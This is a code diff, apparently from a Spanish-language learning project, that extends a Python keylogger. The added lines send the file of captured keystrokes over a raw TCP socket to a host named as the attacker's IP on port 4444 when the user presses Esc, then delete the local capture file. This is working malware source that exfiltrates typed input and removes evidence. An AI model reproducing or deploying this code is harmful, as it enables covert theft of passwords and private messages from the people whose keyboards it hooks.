@@ -26,10 +26,32 @@ def guardar_palabra():
     print(f"Palabra registrada: {palabra}")
     palabra=""
 
+ip_atacante="192.168.1.67"
+puerto=4444
+archivo="output.txt"
+
+def detener_script():
+    print("***Preparando para enviar lo capturado***")
+    keyboard.unhook_all()
+    enviar_archivo(archivo,ip_atacante,puerto)
+
+def enviar_archivo(archivo_a_enviar, ip_destino, puerto_destino):
+    try:
+        with open(archivo_a_enviar,'rb') as file2: #Se tiene que mandar en binarios
+            contenido=file2.read()
+        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
+            s.connect((ip_destino,puerto_destino))
+            s.sendall(contenido)
+            os.remove("output.txt")
+            sys.exit()
+    except Exception as c:
+        print("Tenemos el error: ",c)
+
 keyboard.hook(pulsacion)
 
 try:
     keyboard.wait("esc")
+    detener_script()
 except KeyboardInterrupt:
-    print("Se detuvo el script")
+    print("Error en el script")
     pass
